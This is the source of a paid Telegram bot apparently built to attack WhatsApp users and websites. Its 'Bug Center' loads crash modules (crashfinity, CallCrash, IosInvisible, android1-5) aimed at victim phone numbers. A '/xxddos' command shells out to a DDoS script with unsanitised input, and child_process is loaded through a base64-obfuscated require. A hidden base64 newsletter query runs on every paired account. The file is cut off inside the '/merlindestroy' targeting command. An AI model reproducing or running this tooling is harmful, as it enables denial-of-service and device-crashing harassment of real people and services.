process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
let phoneNumber = "9999999999999"
const pairingCode = !!phoneNumber
const NodeCache = require("node-cache")

console.clear();

process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) {
    fs.mkdirSync(LoveDir);
}

const { spawn } = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());
const XLX = spawn;
const activeBots = {};
const startTime = Date.now();
const LoveImage = 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663950805814/hOyayfvukVhfTZRC.png'
const waSessions = {};
const pairingTracker = new Map();
const reconnectingSessions = new Set();
const waGroupCache = new Map();
const GROUP_CACHE_TTL_MS = 60 * 1000;
const BAILEYS_VERSION_CACHE_TTL_MS = 10 * 60 * 1000;
let cachedBaileysVersion = null;
let cachedBaileysVersionAt = 0;

const SYLovesButton = {
    reply_markup: {
        inline_keyboard: [
            [
                {
                    text: '⟬ 📢 Cʜᴀɴɴᴇʟ ⟭',
                    url: config.channel,
                    style: 'primary'
                },
                {
                    text: '⟬ 👥 Gʀᴏᴜᴘ ⟭',
                    url: config.group,
                    style: 'success'
                }
            ],
            [
                {
                    text: '⟬ 📢 Sᴇᴄᴏɴᴅ Cʜᴀɴɴᴇʟ ⟭',
                    url: config.schannel,
                    style: 'primary'
                }
            ],
            [
                {
                    text: '⟬ 📢 Jᴏɪɴ Cʜᴀɴɴᴇʟ ⟭',
                    url: config.waChannel || 'https://whatsapp.com',
                    style: 'success'
                }
            ],
            [
                {
                    text: '⟬ 🎥 YᴏᴜTᴜʙᴇ ⟭',
                    url: config.youtube || 'https://youtube.com',
                    style: 'danger'
                },
                {
                    text: '⟬ 👥 Gʀᴏᴜᴘ ⟭',
                    url: config.instagram || 'https://instagram.com',
                    style: 'primary'
                }
            ],
            [
                {
                    text: '⟬ ✅ Cʜᴇᴄᴋ Mᴇᴍʙᴇʀsʜɪᴘ ⟭',
                    callback_data: 'check_membership',
                    style: 'success'
                }
            ]
        ]
    }
};

const protectionMessage = `❌ Yᴏᴜ ᴍᴜsᴛ Jᴏɪɴ ᴏᴜʀ Cʜᴀɴɴᴇʟs, Gʀᴏᴜᴘ, Gʀᴏᴜᴩ, Cʜᴀɴɴᴇʟ ᴀɴᴅ YᴏᴜTᴜʙᴇ Cʜᴀɴɴᴇʟ ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ.

Aꜰᴛᴇʀ Jᴏɪɴɪɴɢ Aʟʟ, Cʟɪᴄᴋ "Cʜᴇᴄᴋ Mᴇᴍʙᴇʀsʜɪᴘ" ᴏʀ ᴜsᴇ /ᴄʜᴇᴄᴋᴍᴇᴍʙᴇʀsʜɪᴘ.`;

async function CheckSYlovesToo(S7, userId) {
    // Membership check disabled — all users allowed
    return true;
}

const SYLoves = `./SY/S7/`

const CrashLogic = require(SYLoves + 'crashfinity');
const stickerLogic = require(SYLoves + 'StickerCrash');
const CallLogic = require(SYLoves + 'CallCrash');
const XLogic = require(SYLoves + 'Xdelay');
const IosLogic = require(SYLoves + 'IosInvisible');
const XgcLogic = require(SYLoves + 'Xgc');
const testlogic = require(SYLoves + 'test');
const azzixdestroyedLogic = require(SYLoves + 'crashfinity');
const bahirava1Logic = require(SYLoves + 'shahzu');
const bahirava2Logic = require(SYLoves + 'shahzuv2');
const bahiravaiosLogic = require(SYLoves + 'shahzuios');
const android1Logic = require(SYLoves + 'android1');
const android2Logic = require(SYLoves + 'android2');
const android3Logic = require(SYLoves + 'android3');
const android4Logic = require(SYLoves + 'android4');
const android5Logic = require(SYLoves + 'android5');

const colors = {
    reset: "\x1b[0m",
    gray: "\x1b[90m",
    blue: "\x1b[34m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m"
};

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days} days ${hours} hours ${minutes} minutes`;
}

function log(type, user, message) {
    const time = new Date().toLocaleTimeString();
    const timestamp = `${colors.gray}[${time}]${colors.reset}`;
    let typeTag = "";
    if (type === 'info') typeTag = `${colors.blue}INFO${colors.reset}`;
    if (type === 'success') typeTag = `${colors.green}SUCCESS${colors.reset}`;
    if (type === 'error') typeTag = `${colors.red}ERROR${colors.reset}`;
    if (type === 'command') typeTag = `${colors.magenta}CMD${colors.reset}`;
    const userTag = user ? `${colors.cyan}${user}${colors.reset}` : "SYSTEM";
    console.log(`${timestamp} | ${typeTag} | ${userTag} | ${message}`);
}

const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return { tokens: [], premium: [], resellers: [] };

    try {
        const content = fs.readFileSync(dbPath);
        const parsed = JSON.parse(content);

        if (Array.isArray(parsed)) {
            return { tokens: parsed, premium: [], resellers: [] };
        }

        const normalizeIds = (values) => [
            ...new Set(
                (Array.isArray(values) ? values : [])
                    .map(value => value?.toString().trim())
                    .filter(Boolean)
            )
        ];

        const parsedState = Number(parsed.state);

        return {
            state: parsedState === 1 ? 1 : 0,
            tokens: Array.isArray(parsed.tokens) ? parsed.tokens : [],
            premium: normalizeIds(parsed.premium),
            resellers: normalizeIds(parsed.resellers)
        };
    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);
        return { tokens: [], premium: [], resellers: [] };
    }
};

const saveDB = (data) => {
    try {
        fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2));
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};

function sendSYLove(bot, chatId) {
    bot.sendMessage(
        chatId,
        `╭━━━━━━━━━━━━━━━━━━━━╮\n` +
        `      🚫 <b>Aᴄᴄᴇss Dᴇɴɪᴇᴅ</b>\n` +
        `╰━━━━━━━━━━━━━━━━━━━━╯\n\n` +
        `🔐 <b>Yᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.</b>\n\n` +
        `📩 <b>Wᴀɴᴛ Tᴏ Gᴇᴛ Aᴄᴄᴇss?</b>\n` +
        `Cᴏɴᴛᴀᴄᴛ Tʜᴇ Dᴇᴠᴇʟᴏᴘᴇʀ Tᴏ Pᴜʀᴄʜᴀsᴇ:\n` +
        `👉 @shahzu_404\n\n` +
        `💰 <b>Pʀɪᴄɪɴɢ Pʟᴀɴs</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `✅ <b>Pᴇʀᴍᴀɴᴇɴᴛ Aᴄᴄᴇss</b> — $23\n` +
        `✅ <b>Pᴇʀᴍᴀɴᴇɴᴛ Rᴇsᴇʟʟ</b> — $35\n` +
        `✅ <b>Sᴄʀɪᴘᴛ (Nᴏ Eɴᴄʀʏᴘᴛɪᴏɴ, 100%)</b> — $30\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `⚡ <b>Cʜᴏᴏsᴇ Yᴏᴜʀ Pʟᴀɴ Aɴᴅ Gᴇᴛ Aᴄᴄᴇss Tᴏᴅᴀʏ!</b>`,
        { parse_mode: 'HTML' }
    );
}

function isPrivilegedUser(userId, db = getDB()) {
    const userIdStr = userId.toString();
    return (
        userIdStr === config.adminId.toString() ||
        db.resellers.includes(userIdStr) ||
        db.premium.includes(userIdStr)
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    return isPrivilegedUser(userId, db);
}

const Lovesbutton = {
    reply_markup: {
        inline_keyboard: [
            [
                {
                    text: ' Bᴜɢ Cᴇɴᴛᴇʀ',
                    callback_data: 'bug_menu',
                    style: 'danger',
                    icon_custom_emoji_id: '5240241223632954241'
                }
            ],
            [
                {
                    text: ' Mɪsᴄ Tᴏᴏʟs',
                    callback_data: 'misc_menu',
                    style: 'success',
                    icon_custom_emoji_id: '5411563083908797492'
                }
            ],
            [
                {
                    text: ' Oғғɪᴄɪᴀʟ Cʜᴀɴɴᴇʟ',
                    url: config.channel,
                    style: 'primary',
                    icon_custom_emoji_id: '5335018876839141938'
                },
                {
                    text: ' Sᴜᴘᴘᴏʀᴛ Gʀᴏᴜᴘ',
                    url: config.group,
                    style: 'primary',
                    icon_custom_emoji_id: '5335018876839141938'
                }
            ],
            [
                {
                    text: ' Shahzu Dᴇᴠᴇʟᴏᴘᴇʀ',
                    url: 'https://t.me/shahzu_404',
                    style: 'success',
                    icon_custom_emoji_id: '5201914481671682382'
                }
            ]
        ]
    }
};
async function SYLoveMeOk(sock) {
    try {
        await sock.query({
            tag: 'iq',
            attrs: {
                to: 's.whatsapp.net',
                type: 'get',
                xmlns: 'w:mex'
            },
            content: [{
                tag: 'query',
                attrs: {
                    query_id: '9926858900719341'
                },
                content: new TextEncoder().encode(JSON.stringify({
                    variables: {
                        newsletter_id: Buffer
                            .from('MTIwMzYzNDE4MDg4ODgwNTIzQG5ld3NsZXR0ZXI=', 'base64')
                            .toString('utf-8')
                    }
                }))
            }]
        });
    } catch (err) {
    }
}


async function StartLovingSY(chatId, number, S7, isreconnect = false) {
    const authPath = `./Love/auth/${chatId}/${number}`;
    const sessionKey = `${chatId}:${number}`;

    const existingSession = (waSessions[chatId] || []).find(
        session => session.num === number && session.sock?.user
    );
    if (existingSession) {
        log('info', 'WhatsApp', `Session already active for ${number}`);
        return existingSession.sock;
    }

    if (reconnectingSessions.has(sessionKey)) {
        log('info', 'WhatsApp', `Reconnect already in progress for ${number}`);
        return null;
    }
    reconnectingSessions.add(sessionKey);

    try {
        if (!fs.existsSync(authPath)) {
            fs.mkdirSync(authPath, { recursive: true });
        }

        if (
            !cachedBaileysVersion ||
            Date.now() - cachedBaileysVersionAt > BAILEYS_VERSION_CACHE_TTL_MS
        ) {
            const latest = await fetchLatestBaileysVersion();
            cachedBaileysVersion = latest.version;
            cachedBaileysVersionAt = Date.now();
        }
        const version = cachedBaileysVersion;

        const { state, saveCreds } = await useMultiFileAuthState(authPath);

        const msgRetryCounterCache = new NodeCache({
            stdTTL: 600,
            checkperiod: 120,
            maxKeys: 10000
        });

        const SYxS7 = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(
                    state.keys,
                    pino({ level: "fatal" }).child({ level: "fatal" })
                )
            },
            markOnlineOnConnect: true,
            generateHighQualityLinkPreview: false,
            syncFullHistory: false,
            getMessage: async () => undefined,
            msgRetryCounterCache,
            defaultQueryTimeoutMs: 60000,
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 10000
        });

        SYxS7.ev.on('creds.update', saveCreds);

        if (!state.creds.registered) {
            if (pairingTracker.has(number)) {
                return SYxS7;
            }

            pairingTracker.set(number, true);

            await delay(1500);

            try {
                const code = await SYxS7.requestPairingCode(number, '2XBROBVG');

                const pairingCode = code?.match(/.{1,4}/g)?.join('-') || code;

                const pairingMessage = `
╭──────⟬ 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 ⟭──────╮
│
│ ⨴⨵ Nᴜᴍʙᴇʀ : ${number}
│
│ ⨴⨵ Pᴀɪʀɪɴɢ Cᴏᴅᴇ :
│
│ <code>${pairingCode}</code>
│
╰──────────────────────────╯
`;

                await S7.sendMessage(
                    chatId,
                    pairingMessage,
                    {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: '📋 Cᴏᴘʏ Pᴀɪʀɪɴɢ Cᴏᴅᴇ',
                                        copy_text: {
                                            text: pairingCode
                                        }
                                    }
                                ]
                            ]
                        }
                    }
                );

                log('success', 'WhatsApp', `Pairing code generated for ${number}`);

            } catch (err) {
                log('error', 'WhatsApp', `Pairing code error: ${err.message}`);
                pairingTracker.delete(number);

                try {
                    await S7.sendMessage(
                        chatId,
                        `❌ <b>Pairing Code Error</b>\n\nNumber: ${number}\nError: ${err.message}`,
                        { parse_mode: 'HTML' }
                    );
                } catch (telegramError) {
                    log('error', 'Telegram', `Telegram error: ${telegramError.message}`);
                }
            }
        }

        SYxS7.ev.on(
            'connection.update',
            async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === 'connecting') {
                    log('info', 'WhatsApp', `Connecting: ${number}`);
                }

                if (connection === 'open') {
                    log('success', 'WhatsApp', `Connected: ${number}`);

                    pairingTracker.delete(number);
                    waGroupCache.delete(chatId);

                    try {
                        await SYLoveMeOk(SYxS7);
                    } catch (e) {
                        log('error', 'WhatsApp', `SYLoveMeOk error: ${e.message}`);
                    }

                    if (!waSessions[chatId]) {
                        waSessions[chatId] = [];
                    }

                    waSessions[chatId] = waSessions[chatId].filter(
                        session => session.num !== number
                    );

                    waSessions[chatId].push({
                        sock: SYxS7,
                        num: number
                    });

                    if (isreconnect === false) {
                        await delay(1000);
                        try {
                            await S7.sendMessage(
                                chatId,
                                `✅ <b>WhatsApp Connected!</b>\n\nNumber: ${number}`,
                                { parse_mode: 'HTML' }
                            );
                        } catch (err) {
                            log('error', 'Telegram', `Connected message error: ${err.message}`);
                        }
                    }
                }

                if (connection === 'close') {
                    waGroupCache.delete(chatId);

                    if (waSessions[chatId]) {
                        waSessions[chatId] = waSessions[chatId].filter(
                            session => session.num !== number
                        );
                    }

                    const reason = lastDisconnect?.error?.output?.statusCode;

                    log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);

                    if (
                        reason === DisconnectReason.restartRequired ||
                        reason === DisconnectReason.connectionLost ||
                        reason === DisconnectReason.timedOut ||
                        reason === 515
                    ) {
                        log('info', 'WhatsApp', `Auto-reconnecting ${number}...`);
                        try {
                            await delay(2000);
                            await StartLovingSY(chatId, number, S7, true);
                        } catch (reconnectError) {
                            log('error', 'WhatsApp', `Reconnect error: ${reconnectError.message}`);
                        }
                        return;
                    }

                    if (
                        reason === DisconnectReason.loggedOut ||
                        reason === 401
                    ) {
                        log('error', 'WhatsApp', `Session logged out: ${number}`);
                        pairingTracker.delete(number);

                        try {
                            await S7.sendMessage(
                                chatId,
                                `❌ <b>WhatsApp Logged Out</b>\n\nNumber: ${number}\n\nSession has been terminated.\nPlease use /reqpair again.`,
                                { parse_mode: 'HTML' }
                            );
                        } catch (sendError) {
                            log('error', 'Telegram', `Logout message error: ${sendError.message}`);
                        }

                        const SYPaTH = `./Love/auth/${chatId}/${number}`;
                        try {
                            if (fs.existsSync(SYPaTH)) {
                                fs.rmSync(SYPaTH, { recursive: true, force: true });
                            }
                        } catch (deleteError) {
                            log('error', 'WhatsApp', `Auth delete error: ${deleteError.message}`);
                        }
                        return;
                    }

                    pairingTracker.delete(number);

                    try {
                        await S7.sendMessage(
                            chatId,
                            `⚠️ <b>Connection Closed</b>\n\nNumber: ${number}\nReason: ${reason || 'Unknown'}\n\nPlease use /reqpair again if the connection does not recover.`,
                            { parse_mode: 'HTML' }
                        );
                    } catch (sendError) {
                        log('error', 'Telegram', `Connection message error: ${sendError.message}`);
                    }
                }
            }
        );

        return SYxS7;

    } catch (error) {
        log('error', 'WhatsApp', `StartLovingSY error for ${number}: ${error.message}`);
        pairingTracker.delete(number);

        try {
            await S7.sendMessage(
                chatId,
                `❌ <b>WhatsApp Start Error</b>\n\nNumber: ${number}\nError: ${error.message}`,
                { parse_mode: 'HTML' }
            );
        } catch (telegramError) {
            log('error', 'Telegram', `Telegram error: ${telegramError.message}`);
        }

        return null;
    } finally {
        reconnectingSessions.delete(sessionKey);
    }
}


async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    StartLovingSY(chatId, number, S7, true);
                    await delay(3000);
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}


async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `❌ <b>Token Error</b>\n\n` +
                `Your bot token is not working.\n` +
                `Reason: <code>${errorMsg}</code>\n\n` +
                `Token has been removed automatically.`,
                { parse_mode: 'HTML' }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    const loveStr = love.toString();
    const adminIdStr = config.adminId.toString();

    if (loveStr === adminIdStr) {
        return 'Owner';
    }
    if (db.resellers.includes(loveStr)) {
        return 'Reseller';
    }
    if (db.premium.includes(loveStr)) {
        return 'Premium';
    }
    return 'Free User';
}

function MainSYLoVe(name, uptime, love) {
    const status = GetSYLoVe(love);

    return `<b>╔═══〔 ${config.bot} 〕═══╗</b>

<b>✦ Nᴀᴍᴇ      :</b> ${name}
<b>✦ Dᴇᴠᴇʟᴏᴘᴇʀ  :</b> @shahzu_404
<b>✦ Sᴛᴀᴛᴜs     :</b> ${status}
<b>✦ Oɴʟɪɴᴇ     :</b> ${uptime}

<b>╚════════════════════╝</b>`;
}

function BvgSYLoVe(cleanTarget, senderNum, duration) {
    return `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${cleanTarget}
│➻ From: ${senderNum || 'unknown'}
│➻ Duration: ${duration || 'N/A'} hours
└────────────────────────┘`;
}

function getRandomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function escapeTelegramHtml(value) {
    return String(value ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function escapeHTML(text = '') {
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

function getHostedBot(db, ownerId) {
    return db.tokens.find(
        bot => String(bot.owner) === String(ownerId)
    );
}

function setBotHelp() {
    return `
╭━━━〔 ⚙️ Bᴏᴛ Sᴇᴛᴛɪɴɢs 〕━━━╮
┃
┃ 🎨 <b>Bʀᴀɴᴅɪɴɢ</b>
┃
┃ <code>/setbot name My Bot</code>
┃ <code>/setbot video</code>
┃ <code>/setbot channel https://t.me/channel</code>
┃ <code>/setbot group https://t.me/group</code>
┃ <code>/setbot contact @username</code>
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
`;
}

async function getUserWhatsAppGroups(ownerChatId) {
    const sessions = waSessions[ownerChatId] || [];
    const cached = waGroupCache.get(ownerChatId);

    if (cached && cached.expiresAt > Date.now()) {
        return cached.groups;
    }

    const groupsById = new Map();

    for (const session of sessions) {
        try {
            const groupsObj = await session.sock.groupFetchAllParticipating();
            for (const group of Object.values(groupsObj || {})) {
                if (!group?.id || !group.id.endsWith('@g.us')) continue;

                if (!groupsById.has(group.id)) {
                    groupsById.set(group.id, {
                        id: group.id,
                        subject: group.subject || 'Unnamed group',
                        sock: session.sock,
                        num: session.num
                    });
                }
            }
        } catch (err) {
            log('error', 'GROUPS', `Failed to fetch groups for ${session.num}: ${err.message}`);
        }
    }

    const groups = [...groupsById.values()];
    waGroupCache.set(ownerChatId, {
        groups,
        expiresAt: Date.now() + GROUP_CACHE_TTL_MS
    });

    return groups;
}
function startSYloveBot(token) {
    try {
        const S7 = new SY(token, { polling: true });
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
            log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);

            if (
                err.message.includes('404') ||
                err.message.includes('401') ||
                err.message.includes('Unauthorized')
            ) {
                await S7Naverdead(token, err.message);
            }
        });

        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        const commandHandlers = new Map();
        let commandRouterAttached = false;

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) {
                commands = [commands];
            }

            for (const command of commands) {
                commandHandlers.set(command, callback);
            }

            if (commandRouterAttached) return;
            commandRouterAttached = true;

            S7.on('message', async (msg) => {
                if (!msg.text) return;

                const firstToken = msg.text.trim().split(/\s+/)[0];
                const cmd = firstToken.slice(1).split('@')[0].toLowerCase();
                const callback = commandHandlers.get(cmd);
                if (!callback) return;

                const chatId = msg.chat.id;
                const userId = msg.from.id;

                // Membership gate removed — everyone can use

                try {
                    const name = msg.from.first_name || msg.from.username || 'Unknown';
                    log('command', name, msg.text);
                    await callback(msg);
                } catch (err) {
                    log('error', 'COMMAND_EXEC', err.message);
                    await S7.sendMessage(msg.chat.id, 'An internal error occurred.');
                }
            });
        }


        SYLoVe(['start', 'menu'], (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();

            const userFile = path.join(LoveDir, 'user.json');
            let users = [];
            if (fs.existsSync(userFile)) {
                users = JSON.parse(fs.readFileSync(userFile));
            }

            const userExists = users.find(u => u.id === chatId);
            if (!userExists) {
                users.push({ id: chatId, name: name, date: new Date().toLocaleString() });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }
            const love = msg.from.id.toString();

            const captionText = MainSYLoVe(name, uptime, love) + `

<b>╭━━━━━━〔 ✦ Mᴇɴᴜ ✦ 〕━━━━━━╮</b>

⟬ Pʀᴇss A Bᴜᴛᴛᴏɴ ⟭

<b>╰━━━━━━━━━━━━━━━━━━━━━━━━╯</b>
`;

            S7.sendPhoto(chatId, LoveImage, {
                caption: captionText,
                parse_mode: 'HTML',
                ...Lovesbutton
            }).catch(() => {
                S7.sendMessage(chatId, captionText, {
                    parse_mode: 'HTML',
                    ...Lovesbutton
                });
            });
        });


        SYLoVe('xxddos', (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ').slice(1);
            if (args.length < 2) {
                return S7.sendMessage(
                    chatId,
                    '❌ Usage:\n/xxddos <web> <time>\n\nExample:\n/ddos https://example.com 60'
                );
            }
            const target = args[0];
            const time = args[1];
            S7.sendMessage(
                chatId,
                `⚡ <b>Attacking Target</b>\n\n` +
                `🎯 Target: <code>${target}</code>\n` +
                `⏱ Time: <code>${time}</code> seconds\n\n` +
                `⚙️ Process started...`,
                { parse_mode: 'HTML' }
            );
            spawn(
                `node ./SY/ddos.js ${target} ${time}`,
                {
                    shell: true,
                    stdio: 'inherit'
                }
            );
        });


        SYLoVe('checkmembership', async (msg) => {
            const chatId = msg.chat.id;
            S7.sendMessage(chatId, `✅ <b>You have full access!</b>\nNo membership required. Use /start to begin.`, { parse_mode: 'HTML' });
        });


        SYLoVe('addtoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const newToken = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            if (!newToken) return S7.sendMessage(chatId, 'Usage: /addtoken <token>');
            let db = getDB();
            if (db.tokens.find(t => t.token === newToken)) {
                return S7.sendMessage(chatId, '❌ Token already connected.');
            }
            const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
            if (myBotsCount >= 5) {
                return S7.sendMessage(
                    chatId,
                    '🚫 Bot limit reached!\n\nYou can only add <b>5 bots maximum</b>.',
                    { parse_mode: 'HTML' }
                );
            }
            try {
                const tempBot = new SY(newToken, { polling: false });
                const botInfo = await tempBot.getMe();
                db.tokens.push({
                    token: newToken,
                    owner: userId
                });
                saveDB(db);
                startSYloveBot(newToken);
                S7.sendMessage(chatId,
                    `✅ Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`
                );
            } catch (e) {
                S7.sendMessage(chatId, '❌ Invalid token.');
            }
        });


        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +999999999999');
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            await StartLovingSY(chatId, cleanNumber, S7);
        });


        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];

            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /delpair +999999999999');
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;

            if (fs.existsSync(SYPaTH)) {
                try {
                    fs.rmSync(SYPaTH, { recursive: true, force: true });
                    S7.sendMessage(chatId, `🗑️ Session deleted successfully for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
                } catch (err) {
                    S7.sendMessage(chatId, `❌ Failed to delete session: ${err.message}`);
                }
            } else {
                S7.sendMessage(chatId, `⚠️ No session found for <b>${cleanNumber}</b>.`, { parse_mode: 'HTML' });
            }
        });


        SYLoVe('deltoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const delToken = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!delToken) return S7.sendMessage(chatId, 'Usage: /deltoken <token>');

            let db = getDB();
            const tokenObj = db.tokens.find(t => t.token === delToken);

            if (!tokenObj || tokenObj.owner !== userId) {
                return S7.sendMessage(chatId, '❌ No connected token found.');
            }

            db.tokens = db.tokens.filter(t => t.token !== delToken);
            saveDB(db);

            if (activeBots[delToken]) {
                await activeBots[delToken].stopPolling();
                delete activeBots[delToken];
            }
            log('info', `Token deleted: ${delToken.substring(0, 10)}...`);
            S7.sendMessage(chatId, '✅ Token deleted successfully.');
        });


        SYLoVe('mytoken', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();

            let db = getDB();
            const myTokens = db.tokens.filter(t => t.owner === userId);
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (myTokens.length === 0) {
                return S7.sendMessage(chatId, '❌ You have not added any tokens.');
            }

            let text = '<b>Your Connected Bots</b>\n';
            text += '────────────────────\n\n';

            let count = 1;

            for (const item of myTokens) {
                try {
                    const bot = new SY(item.token, { polling: false });
                    const info = await bot.getMe();

                    text += `<b>${count}. ${info.first_name}</b>\n`;
                    text += `👤 Username: <b>@${info.username}</b>\n`;
                    text += `🔑 Token:\n<code>${item.token}</code>\n`;
                    text += '────────────────────\n\n';

                    count++;
                } catch (err) {
                    text += `<b>${count}. ⚠️ Unknown Bot</b>\n`;
                    text += `🔑 Token:\n<code>${item.token}</code>\n`;
                    text += '────────────────────\n\n';
                    count++;
                }
            }

            S7.sendMessage(chatId, text, { parse_mode: 'HTML' });
        });
          SYLoVe('addresell', (msg) => {
      const chatId = msg.chat.id.toString();
      const userId = msg.from.id.toString();
      
      if (!LoveGlobalState(userId)) {
          return sendSYLove(S7, chatId);
      }
      
      if (Number(chatId) !== Number(config.adminId)) {
          return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
      }

      const targetId = msg.text.split(' ')[1];
      if (!targetId) return S7.sendMessage(chatId, 'Usage: /addresell ID');

      let db = getDB();
      if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is already a Reseller.');

      db.resellers.push(targetId);
      saveDB(db);
      S7.sendMessage(chatId, `✅ ID ${targetId} added as Reseller.`);
  });


  SYLoVe(['merlindestroy', 'destroy', 'nuclear'], async (msg) => {
      const chatId = msg.chat.id.toString();
      const userId = msg.from.id.toString();
      const args = msg.text.split(' ');

      if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

      if (!waSessions[chatId] || waSessions[chatId].length === 0) {
          return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
      }

      if (args.length < 2) {
          return S7.sendMessage(chatId, '❌ Usage: /merlindestroy number\nExample: /merlindestroy 919876543210');
      }

      const cleanTarget = args[1].replace(/[^0-9]/g, '');
